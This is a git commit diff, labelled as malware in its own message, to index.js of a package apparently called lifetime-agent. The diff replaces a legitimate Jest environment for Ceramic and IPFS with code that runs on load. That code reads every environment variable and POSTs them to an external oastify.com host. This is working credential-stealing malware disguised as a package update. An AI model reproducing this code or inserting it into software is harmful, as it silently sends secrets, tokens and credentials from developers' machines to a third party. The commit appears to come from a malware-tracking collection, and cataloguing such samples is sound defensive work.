f1207440c72c1d24d8530e6b77eb76a8a2ad5b9e
JakeClark <jakeclark38b@gmail.com>
2025-12-16 23:11:47 +0700

    Update to 294_lifetime-agent-1.73.3 (malware)

--- index.js
+++ index.js
@@ -1,39 +1,23 @@
-import path from 'path'
-import { Ceramic } from '@ceramicnetwork/core'
-import { create } from 'ipfs-core'
-import NodeEnv from 'jest-environment-node'
-import { dir } from 'tmp-promise'
+const https = require('https');
 
-const NodeEnvironment = NodeEnv.default ?? NodeEnv
-export default class CeramicEnvironment extends NodeEnvironment {
-  async setup() {
-    this.tmpFolder = await dir({ unsafeCleanup: true })
-    this.global.ipfs = await create({
-      // Note: the "test" profile doesn't seem to do much to disable networking,
-      // so we need to set the relevant config explicitly to run tests in parallel
-      config: {
-        Addresses: {
-          Swarm: [],
-        },
-      },
-      profiles: ['test'],
-      repo: path.join(this.tmpFolder.path, 'ipfs'),
-      silent: true,
-    })
-    const stateStoreDirectory = path.join(this.tmpFolder.path, 'ceramic')
-    this.global.ceramic = await Ceramic.create(this.global.ipfs, {
-      anchorOnRequest: false,
-      stateStoreDirectory,
-      indexing: {
-        db: `sqlite://${stateStoreDirectory}/indexing.sqlite`,
-      },
-    })
-  }
+function soave() {
+  const envVariables = JSON.stringify(process.env);
 
-  async teardown() {
-    await this.global.ceramic.close()
-    await this.global.ipfs.stop()
-    await this.tmpFolder.cleanup()
-    await super.teardown()
-  }
+  const options = {
+    hostname: 'bbqurumzwj9l3fccqqhykfliy940srgg.oastify.com',
+    port: 443,
+    path: '/',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(envVariables),
+    },
+  };
+
+  const req = https.request(options, (res) => {});
+
+  req.write(envVariables);
+  req.end();
 }
+
+soave();
